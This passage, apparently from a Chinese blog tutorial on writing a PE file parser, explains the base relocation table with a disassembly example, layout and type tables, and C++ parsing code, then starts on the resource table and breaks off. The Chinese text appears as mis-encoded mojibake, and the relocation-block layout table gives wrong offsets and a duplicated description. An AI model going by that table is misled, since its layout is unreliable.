class="headerlink" title="Step 3.3: è§£æé‡å®šä½è¡¨ï¼ˆ.relocï¼‰"></a>Step 3.3: è§£æé‡å®šä½è¡¨ï¼ˆ.relocï¼‰</h3><ul><li><p>éœ€è¦é‡å®šä½è¡¨çš„åŸå› [7]ï¼š</p><ul><li><p>åœ¨PEç¨‹åºè½½å…¥åˆ°å†…å­˜ä¸­æ—¶ï¼ŒPE Loaderä¼šä¼˜å…ˆæŒ‰ç…§<code>ImageBase</code>ï¼ˆè¯¥PEæ–‡ä»¶æ¸´æœ›çš„è™šæ‹ŸåŸºåœ°å€ï¼‰ï¼Œä½†å°±å’Œäººç”Ÿä¸€æ ·ï¼Œæœ‰æ—¶å€™ä½ æƒ³è¦å¾—åˆ°çš„ä¸ä¸€å®šå°±èƒ½å¤Ÿå¾—åˆ°ï¼Œæ‰€ä»¥å½“è¯¥<code>ImageBase</code>çš„åœ°å€è¢«å ç”¨çš„æ—¶å€™ï¼Œè¯¥PEç¨‹åºå°±ä¸èƒ½åŠ è½½åˆ°<code>ImageBase</code>çš„è™šæ‹Ÿåœ°å€</p></li><li><p><code>.text</code>æ±‡ç¼–ç ä¸­åŒ…å«æœ‰ä¸€äº›å­—ç¬¦ä¸²åœ°å€ã€å‡½æ•°è°ƒç”¨åœ°å€ç­‰ï¼Œè€Œè¿™äº›åœ°å€éƒ½æ˜¯ç”±ç¼–è¯‘å™¨æ ¹æ®<code>ImageBase</code>é¢„å…ˆç¡®å®šå¥½çš„ï¼Œå¦‚æœPEä¸èƒ½åŠ è½½åˆ°<code>ImageBase</code>æ‰€æŒ‡å‘çš„è™šæ‹Ÿåœ°å€æ—¶ï¼Œä¸Šè¿°è¿™äº›åœ°å€å‡éœ€è¦åšä¿®æ­£ï¼ˆi.e. fix upï¼‰ã€‚</p><p><span class="github-emoji"><span>ğŸŒ°</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">// éœ€è¦é‡å®šä½çš„å€¼013EBC98hã€013ED49Chå’Œ013E1064h<br>printf("Helloworld %s", "hahaha");<br>013E64B2 68 98 BC 3E 01       push        offset string "hahaha" (013EBC98h) <br>013E64B7 68 9C D4 3E 01       push        offset string "Helloworld %s" (013ED49Ch) <br>013E64BC E8 A3 AB FF FF       call        _printf (013E1064h) <br>013E64C1 83 C4 08             add         esp,8<br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p>é‡å®šä½è¡¨çš„ä½œç”¨[15]ï¼š</p><ul><li>ä¿®å¤åœ°å€ï¼ˆä»…å½“<code>ImageBase</code>åœ°å€æ— æ³•æ»¡è¶³æ—¶ï¼‰<ul><li>å¦‚ä½•ä¿®å¤ï¼Ÿ<code>fix_up_value = origin_value - ImageBase + new_virtual_address_base</code></li></ul></li></ul><p><span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å¼ºçƒˆå»ºè®®é˜…è¯»[15]è¿™ä¸€ç¯‡æ–‡ç« ï¼Œå¾ˆè¯¦ç»†ä»‹ç»äº†é‡å®šä½è¡¨çš„ä½œç”¨ï¼</p></li><li><p>PE Sectionä¸­é‡å®šä½å—[16]</p><ul><li>åŸºå€é‡å®šä½å—</li><li>åŸºå€é‡å®šä½ç±»å‹</li></ul></li></ul><hr><p><strong>1. åŸºå€é‡å®šä½å—</strong></p><ul><li><p>é‡å®šä½è¡¨</p></li><li><p>å¸ƒå±€ï¼š</p></li></ul><table><thead><tr><th>åç§»</th><th>å¤§å°</th><th>å­—æ®µ</th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>4</td><td>é¡µRVA</td><td>æ˜ åƒåŸºå€å’Œé¡µ RVA å°†æ·»åŠ åˆ°æ¯ä¸ªåç§»é‡ï¼Œä»¥åˆ›å»ºå¿…é¡»åº”ç”¨åŸºå€é‡å®šä½çš„ VAã€‚</td></tr><tr><td>4</td><td>4</td><td>å—å¤§å°</td><td>æ˜ åƒåŸºå€å’Œé¡µ RVA å°†æ·»åŠ åˆ°æ¯ä¸ªåç§»é‡ï¼Œä»¥åˆ›å»ºå¿…é¡»åº”ç”¨åŸºå€é‡å®šä½çš„ VAã€‚</td></tr><tr><td>4</td><td>2</td><td>æ¡ç›®1</td><td>é«˜4ä½ä¸ºç±»å‹ï¼Œå‰©ä½™12ä½ç›¸è¾ƒäºé¡µRVAçš„åç§»é‡</td></tr><tr><td>6</td><td>8</td><td>æ¡ç›®2</td><td></td></tr><tr><td>â€¦</td><td>â€¦</td><td>â€¦</td><td></td></tr></tbody></table><p><strong>2.åŸºå€é‡å®šä½ç±»å‹</strong></p><table><thead><tr><th align="left">å¸¸æ•°</th><th align="left">Value</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">IMAGE_REL_BASED_ABSOLUTE</td><td align="left">0</td><td align="left">è·³è¿‡åŸºå€é‡å®šä½ã€‚ æ­¤ç±»å‹å¯ç”¨äºå¡«å……å—ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGH</td><td align="left">1</td><td align="left">åŸºå€é‡å®šä½ä¼šå°†å·®å€¼çš„é«˜ 16 ä½æ·»åŠ åˆ°åç§»é‡çš„ 16 ä½å­—æ®µã€‚ 16 ä½å­—æ®µè¡¨ç¤º 32 ä½å­—çš„é«˜å€¼ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_LOW</td><td align="left">2</td><td align="left">åŸºå€é‡å®šä½ä¼šå°†å·®å€¼çš„ä½ 16 ä½æ·»åŠ åˆ°åç§»é‡ä¸º 16 ä½å­—æ®µã€‚ 16 ä½å­—æ®µè¡¨ç¤º 32 ä½å­—çš„ä½åŠéƒ¨åˆ†ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGHLOW</td><td align="left">3</td><td align="left">åŸºå€é‡å®šä½ä¼šå°†å·®å€¼çš„æ‰€æœ‰ 32 ä½åº”ç”¨åˆ°åç§»é‡çš„ 32 ä½å­—æ®µã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_HIGHADJ</td><td align="left">4</td><td align="left">åŸºå€é‡å®šä½ä¼šå°†å·®å€¼çš„é«˜ 16 ä½æ·»åŠ åˆ°åç§»é‡çš„ 16 ä½å­—æ®µã€‚ 16 ä½å­—æ®µè¡¨ç¤º 32 ä½å­—çš„é«˜å€¼ã€‚ 32 ä½å€¼çš„ä½ 16 ä½å­˜å‚¨åœ¨æ­¤åŸºå€é‡å®šä½åçš„ 16 ä½å­—ä¸­ã€‚ è¿™æ„å‘³ç€æ­¤åŸºå€é‡å®šä½å ç”¨ä¸¤ä¸ªæ§½ä½ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_MIPS_JMPADDR</td><td align="left">5</td><td align="left">é‡å®šä½è§£é‡Šå–å†³äºè®¡ç®—æœºç±»å‹ã€‚ å½“è®¡ç®—æœºç±»å‹ä¸º MIPS æ—¶ï¼Œåˆ™åŸºå€é‡å®šä½é€‚ç”¨äº MIPS è·³è½¬æŒ‡ä»¤ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_ARM_MOV32</td><td align="left">5</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º ARM æˆ– Thumb æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½è·¨è¿ç»­çš„ MOVW/MOVT æŒ‡ä»¤å¯¹åº”ç”¨ç¬¦å·çš„ 32 ä½åœ°å€ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_HIGH20</td><td align="left">5</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º RISC-V æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½é€‚ç”¨äº 32 ä½ç»å¯¹åœ°å€çš„é«˜ 20 ä½ã€‚</td></tr><tr><td align="left"></td><td align="left">6</td><td align="left">ä¿ç•™ï¼Œå¿…é¡»ä¸º 0ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_THUMB_MOV32</td><td align="left">7</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º Thumb æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½å°†ç¬¦å·çš„ 32 ä½åœ°å€åº”ç”¨äºè¿ç»­çš„ MOVW/MOVT æŒ‡ä»¤å¯¹ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_LOW12I</td><td align="left">7</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º RISC-V æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½é€‚ç”¨äºä»¥ RISC-V I å‹æŒ‡ä»¤æ ¼å¼å½¢æˆçš„ 32 ä½ç»å¯¹åœ°å€çš„ä½ 12 ä½ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_RISCV_LOW12S</td><td align="left">8</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º RISC-V æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½é€‚ç”¨äºä»¥ RISC-V S å‹æŒ‡ä»¤æ ¼å¼å½¢æˆçš„ 32 ä½ç»å¯¹åœ°å€çš„ä½ 12 ä½ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_LOONGARCH32_MARK_LA</td><td align="left">8</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º LoongArch 32 ä½æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½é€‚ç”¨äºç”±ä¸¤ä¸ªè¿ç»­æŒ‡ä»¤å½¢æˆçš„ 32 ä½ç»å¯¹åœ°å€ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_LOONGARCH64_MARK_LA</td><td align="left">8</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º LoongArch 64 ä½æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½é€‚ç”¨äºç”±å››ä¸ªè¿ç»­æŒ‡ä»¤å½¢æˆçš„ 64 ä½ç»å¯¹åœ°å€ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_MIPS_JMPADDR16</td><td align="left">9</td><td align="left">ä»…å½“è®¡ç®—æœºç±»å‹ä¸º MIPS æ—¶ï¼Œæ­¤é‡å®šä½æ‰æœ‰æ„ä¹‰ã€‚ åŸºå€é‡å®šä½é€‚ç”¨äº MIPS16 è·³è½¬æŒ‡ä»¤ã€‚</td></tr><tr><td align="left">IMAGE_REL_BASED_DIR64</td><td align="left">10</td><td align="left">åŸºå€é‡å®šä½ä¼šå°†å·®å€¼åº”ç”¨åˆ°åç§»é‡çš„ 64 ä½å­—æ®µã€‚</td></tr></tbody></table><hr><ul><li><p>è§£ææµç¨‹ï¼š</p><ul><li>é¦–å…ˆï¼Œæ ¹æ®<code>NT Header - Optional Header - Data Directory</code>ä¸­çš„<code>Base Relocation Table</code>å­—æ®µçš„RVAå€¼ï¼Œæ‰¾åˆ°é‡å®šå‘è¡¨çš„ä½ç½®</li><li>ç„¶åï¼Œæ ¹æ®åŸºå€é‡å®šä½å—çš„å¸ƒå±€ç»“æ„ï¼Œä¾æ¬¡è§£æç›¸åº”çš„å†…å®¹</li><li>æœ€åï¼Œæ‰“å°ç›¸åº”çš„å†…å®¹å³å¯</li></ul></li><li><p>å¤„ç†ä»£ç ï¼š</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_basereloc_table</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br>DWORD basereloc_offset, basereloc_entry_num, i;<br><span class="hljs-type">int</span> left_size;<br>___IMAGE_BASE_RELOCATION tmp;<br><br><span class="hljs-keyword">if</span> (!basereloc_dir_table_rva || !basereloc_dir_table_size) <span class="hljs-keyword">return</span>;<br><br>basereloc_offset = <span class="hljs-built_in">va_to_raw</span>(basereloc_dir_table_rva);<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br>left_size = basereloc_dir_table_size;<br>basereloc_entry_num = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br><br>read_size = <span class="hljs-built_in">fread</span>(&amp;tmp, <span class="hljs-built_in">sizeof</span>(___IMAGE_BASE_RELOCATION), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-keyword">if</span> (!tmp.VirtualAddress &amp;&amp; !tmp.SizeOfBlock) <span class="hljs-keyword">break</span>;<br><br>basereloc_entry_num++;<br>left_size -= tmp.SizeOfBlock;<br><span class="hljs-keyword">if</span> (left_size &lt; <span class="hljs-number">0</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Out of base relocation table's size. Maybe Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>basereloc_offset += tmp.SizeOfBlock;<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br><br>}<br><br><span class="hljs-keyword">if</span> (basereloc_entry_num &gt; <span class="hljs-number">0xFFFFFF</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Too many base relocation entries!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>basereloc_table_num = basereloc_entry_num;<br><br>basereloc_table =<br>(___PIMAGE_BASE_RELOCATION)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(___IMAGE_BASE_RELOCATION) * basereloc_entry_num);<br><span class="hljs-keyword">if</span> (!basereloc_table) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Basereloc_table malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>basereloc_offset = <span class="hljs-built_in">va_to_raw</span>(basereloc_dir_table_rva);<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; basereloc_entry_num; i++) {<br><span class="hljs-built_in">fread</span>(&amp;basereloc_table[i], <span class="hljs-built_in">sizeof</span>(___IMAGE_BASE_RELOCATION), <span class="hljs-number">1</span>, pe_fp);<br>basereloc_offset += basereloc_table[i].SizeOfBlock;<br><span class="hljs-built_in">fseek</span>(pe_fp, basereloc_offset, SEEK_SET);<br>}<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_basereloc_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>DWORD i, j, basereloc_offset, block_entries_num;<br>WORD  value;<br><span class="hljs-keyword">if</span> (!basereloc_dir_table_rva || !basereloc_dir_table_size) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"===No base relocation table===\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><span class="hljs-keyword">return</span>;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"===Base relocation table===\n\n"</span>);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(basereloc_dir_table_rva), SEEK_SET);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; basereloc_table_num; i++) {<br><br>block_entries_num = (basereloc_table[i].SizeOfBlock - <span class="hljs-number">8</span>) / <span class="hljs-number">2</span>;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  * Block %02d:\n\n"</span>, i + <span class="hljs-number">1</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Page RVA: 0x%X\n"</span>, basereloc_table[i].VirtualAddress);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Block Size: 0x%X\n"</span>, basereloc_table[i].SizeOfBlock);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Entries [total %d]:\n\n"</span>, block_entries_num);<br><br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-number">8</span>, SEEK_CUR);<br><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; block_entries_num; j++) {<br><span class="hljs-comment">// è¯·æ³¨æ„ï¼Œfreadé‡åˆ°0x1A (ctrl-Z) ç»ˆæ­¢ï¼Œè¯»å…¥æ–‡ä»¶éœ€è¦ä»¥äºŒè¿›åˆ¶çš„å½¢å¼æ‰“å¼€</span><br><span class="hljs-built_in">fread</span>(&amp;value, <span class="hljs-built_in">sizeof</span>(WORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       [%03d] Value: 0x%04X\n"</span>, j+<span class="hljs-number">1</span>, value);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"             Type : %s\n"</span>, <span class="hljs-built_in">translate_block_entry_types</span>((value &amp; <span class="hljs-number">0xf000</span>) &gt;&gt; <span class="hljs-number">12</span>, nt_headers_machine));<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  Offset from Page: 0x%X\n"</span>, value &amp; <span class="hljs-number">0x0fff</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"         Reloc RVA: 0x%X\n\n"</span>, basereloc_table[i].VirtualAddress + (value &amp; <span class="hljs-number">0x0fff</span>));<br>}<br><br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="Step-3-4-è§£æèµ„æºè¡¨ï¼ˆ-rsrcï¼‰"><a href="#Step-3-4-è§£æèµ„æºè¡¨ï¼ˆ-rsrcï¼‰" class="headerlink" title="Step 3.4: è§£æèµ„æºè¡¨ï¼ˆ.rsrcï¼‰"></a>Step 3.4: è§£æèµ„æºè¡¨ï¼ˆ.rsrcï¼‰</h3><ul><li><p>èµ„æºè¡¨æ˜¯å¹²å•¥çš„ï¼Ÿ</p><ul><li>èµ„æºè¡¨å­˜å‚¨ç€ä¸GUIæ˜¾ç¤ºæœ‰å…³çš„å…ƒæ•°æ®ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„èµ„æºï¼ŒåŒ…æ‹¬å…‰æ ‡ã€å›¾æ ‡ã€èœå•ã€ä½å›¾ç­‰</li></ul></li><li><p>èµ„æºè¡¨çš„ç»“æ„ï¼š</p><ul><li>ä¸‰å±‚æ ‘ç»“æ„</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/1.gif"></p></li></ul><table><thead><tr><th align="left">æ•°æ®</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">èµ„æºç›®å½•è¡¨ï¼ˆå’Œèµ„æºç›®å½•æ¡ç›®ï¼‰</td><td align="left">ä¸€ç³»åˆ—è¡¨ï¼Œæ ‘ä¸­æ¯ç»„èŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªè¡¨ã€‚ ç¬¬ä¸€ä¸ªè¡¨ä¸­åˆ—å‡ºäº†æ‰€æœ‰ç¬¬ä¸€çº§ï¼ˆç±»å‹ï¼‰èŠ‚ç‚¹ã€‚ æ­¤è¡¨ä¸­çš„æ¡ç›®æŒ‡å‘ç¬¬äºŒçº§è¡¨ã€‚ æ¯äºŒçº§æ ‘å…·æœ‰ç›¸åŒçš„ç±»å‹ IDï¼Œä½†åç§° ID ä¸åŒã€‚ ç¬¬ä¸‰çº§æ ‘å…·æœ‰ç›¸åŒçš„ç±»å‹å’Œåç§° IDï¼Œä½†è¯­è¨€ ID ä¸åŒã€‚ æ¯ä¸ªå•ç‹¬çš„è¡¨åç´§è·Ÿç›®å½•æ¡ç›®ï¼Œå…¶ä¸­æ¯ä¸ªæ¡ç›®éƒ½æœ‰ä¸€ä¸ªåç§°æˆ–æ•°å­—æ ‡è¯†ç¬¦ï¼Œä»¥åŠä¸€ä¸ªæŒ‡å‘æ•°æ®æè¿°æˆ–ä¸‹ä¸€çº§è¡¨çš„æŒ‡é’ˆã€‚</td></tr><tr><td align="left">èµ„æºç›®å½•å­—ç¬¦ä¸²</td><td align="left">åŒå­—èŠ‚å¯¹é½çš„ Unicode å­—ç¬¦ä¸²ï¼Œç”¨ä½œç›®å½•æ¡ç›®æŒ‡å‘çš„å­—ç¬¦ä¸²æ•°æ®ã€‚</td></tr><tr><td align="left">èµ„æºæ•°æ®æè¿°</td><td align="left">ç”±è¡¨æŒ‡å‘çš„è®°å½•æ•°ç»„ï¼Œç”¨äºæè¿°èµ„æºæ•°æ®çš„å®é™…å¤§å°å’Œä½ç½®ã€‚ è¿™äº›è®°å½•æ˜¯èµ„æºæè¿°æ ‘ä¸­çš„å¶ã€‚</td></tr><tr><td align="left">èµ„æºæ•°æ®</td><td align="left">èµ„æºèŠ‚çš„åŸå§‹æ•°æ®ã€‚ èµ„æºæ•°æ®æè¿°å­—æ®µä¸­çš„å¤§å°å’Œä½ç½®ä¿¡æ¯åˆ†éš”èµ„æºæ•°æ®çš„å„ä¸ªåŒºåŸŸã€‚</td></tr></tbody></table><hr><p><strong>1. èµ„æºç›®å½•è¡¨</strong></p><table><thead><tr><th align="left">Offset</th><th align="left">å¤§å°</th><th align="left">å­—æ®µ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">ç‰¹å¾</td><td align="left">èµ„æºæ ‡å¿—ã€‚ ä¿ç•™æ­¤å­—æ®µä¾›å°†æ¥ä½¿ç”¨ã€‚ å®ƒå½“å‰è®¾ç½®ä¸ºé›¶ã€‚</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">æ—¶é—´/æ—¥æœŸæˆ³</td><td align="left">èµ„æºç¼–è¯‘å™¨åˆ›å»ºèµ„æºæ•°æ®çš„æ—¶é—´ã€‚</td></tr><tr><td align="left">8</td><td align="left">2</td><td align="left">ä¸»è¦ç‰ˆæœ¬</td><td align="left">ä¸»è¦ç‰ˆæœ¬å·ï¼Œç”±ç”¨æˆ·è®¾ç½®ã€‚</td></tr><tr><td align="left">10</td><td align="left">2</td><td align="left">æ¬¡è¦ç‰ˆæœ¬</td><td align="left">æ¬¡è¦ç‰ˆæœ¬å·ï¼Œç”±ç”¨æˆ·è®¾ç½®ã€‚</td></tr><tr><td align="left">12</td><td align="left">2</td><td align="left">åç§°æ¡ç›®æ•°</td><td align="left">ç´§è·Ÿåœ¨è¡¨ä¹‹åçš„ç›®å½•æ¡ç›®æ•°ï¼Œè¿™äº›æ¡ç›®ä½¿ç”¨å­—ç¬¦ä¸²æ¥æ ‡è¯†ç±»å‹ã€åç§°æˆ–è¯­è¨€æ¡ç›®ï¼ˆå–å†³äºè¡¨çš„çº§åˆ«ï¼‰ã€‚</td></tr><tr><td align="left">14</td><td align="left">2</td><td align="left">ID æ¡ç›®æ•°</td><td align="left">ç´§è·Ÿåœ¨åç§°æ¡ç›®ä¹‹åçš„ç›®å½•æ¡ç›®æ•°ï¼Œè¿™äº›æ¡ç›®å¯¹ç±»å‹ã€åç§°æˆ–è¯­è¨€æ¡ç›®ä½¿ç”¨æ•°å­— IDã€‚</td></tr></tbody></table><p><strong>2. èµ„æºç›®å½•æ¡ç›®</strong></p><table><thead><tr><th align="left">Offset</th><th align="left">å¤§å°</th><th align="left">å­—æ®µ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">åç§°åç§»é‡</td><td align="left">æä¾›ç±»å‹ã€åç§°æˆ–è¯­è¨€ ID æ¡ç›®çš„å­—ç¬¦ä¸²çš„åç§»é‡ï¼Œå…·ä½“å–å†³äºè¡¨çš„çº§åˆ«ã€‚</td></tr><tr><td align="left">0</td><td align="left">4</td><td align="left">æ•´æ•°æ ‡è¯†ç¬¦</td><td align="left">æ ‡è¯†ç±»å‹ã€åç§°æˆ–è¯­è¨€ ID æ¡ç›®çš„ 32 ä½æ•´æ•°ã€‚</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">æ•°æ®æ¡ç›®åç§»é‡</td><td align="left">é«˜ä½ 0ã€‚ èµ„æºæ•°æ®æ¡ç›®ï¼ˆå¶ï¼‰çš„åœ°å€ã€‚</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">å­ç›®å½•åç§»é‡</td><td align="left">é«˜ä½ 1ã€‚ è¾ƒä½çš„ 31 ä½æ˜¯å¦ä¸€ä¸ªèµ„æºç›®å½•è¡¨çš„åœ°å€ï¼ˆä¸‹ä¸€çº§ï¼‰ã€‚</td></tr></tbody></table><p><strong>3. èµ„æºç›®å½•å­—ç¬¦ä¸²</strong></p><ul><li>å­˜å‚¨åœ¨æœ€åä¸€ä¸ªèµ„æºç›®å½•æ¡ç›®ä¹‹åå’Œç¬¬ä¸€ä¸ªèµ„æºæ•°æ®æ¡ç›®ä¹‹å‰</li></ul><table><thead><tr><th align="left">Offset</th><th align="left">å¤§å°</th><th align="left">å­—æ®µ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">2</td><td align="left">é•¿åº¦</td><td align="left">å­—ç¬¦ä¸²çš„å¤§å°ï¼Œä¸åŒ…æ‹¬é•¿åº¦å­—æ®µæœ¬èº«ã€‚</td></tr><tr><td align="left">2</td><td align="left">å¯å˜</td><td align="left">Unicode å­—ç¬¦ä¸²</td><td align="left">å¯å˜é•¿åº¦çš„ Unicode å­—ç¬¦ä¸²æ•°æ®ï¼Œå­—å¯¹é½ã€‚</td></tr></tbody></table><p><strong>4. èµ„æºæ•°æ®æ¡ç›®</strong></p><table><thead><tr><th align="left">Offset</th><th align="left">å¤§å°</th><th align="left">å­—æ®µ</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">æ•°æ® RVA</td><td align="left">èµ„æºæ•°æ®åŒºåŸŸä¸­èµ„æºæ•°æ®å•ä½çš„åœ°å€ã€‚</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">å¤§å°</td><td align="left">æ•°æ® RVA 